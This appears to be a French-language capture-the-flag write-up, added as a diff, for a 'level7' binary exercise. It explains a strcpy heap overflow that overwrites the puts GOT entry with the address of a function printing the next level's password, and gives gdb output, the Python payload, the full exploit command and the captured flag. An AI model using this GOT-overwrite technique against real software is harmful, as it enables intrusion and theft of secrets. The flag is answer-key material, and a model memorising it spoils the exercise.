@@ -1,0 +1,32 @@
+le program level7 recupere le contenue du fichier /home/user/level8/.pass
+et le stock dans un buffer
+ce buffer est affiche dans la fonction m qui n'est pas appele
+
+  __stream = fopen("/home/user/level8/.pass","r");
+  fgets(c, 68, __stream);
+  puts("~~");
+
+apres avoir recupere le contenue du fichier le program appel la fonction puts qui va etre dans la GOT(Global Offset Table)
+on va change dans la GOT le pointer vers puts vers la fonction m qui affiche le contenue de /home/user/level8/.pass
+
+(gdb) disas m
+Dump of assembler code for function m:
+   0x080484f4 <+0>:	push   %ebp
+
+l'address de la fonction m est 0x080484f4
+
+0x8049928 <puts@got.plt>:	0xb7e927e0
+  0xb7e927e0 <puts>:	sub    $0x3c,%esp
+
+l'address dans la GOT de la fonction puts est 0x8049928
+
+
+on utilise un buffer overflow sur strcpy((char *)puVar1[1], argv[1]); qui nous permet d'ecrire l'address dans la GOT de la fonction puts soit 0x8049928 dans puVar3[1]
+python -c 'print "A"*20 + "\x28\x99\x04\x08"'
+
+et quand le deuxieme argument est copie dans puVar3[1] avec strcpy((char *)puVar3[1], argv[2]); on ecris l'address de la fonction m 0x080484f4
+echo -e '\xf4\x84\x04\x08'
+
+$ ./level7 "$(python -c 'print "A"*20 + "\x28\x99\x04\x08"')" "$(echo -e '\xf4\x84\x04\x08')"
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1636382960
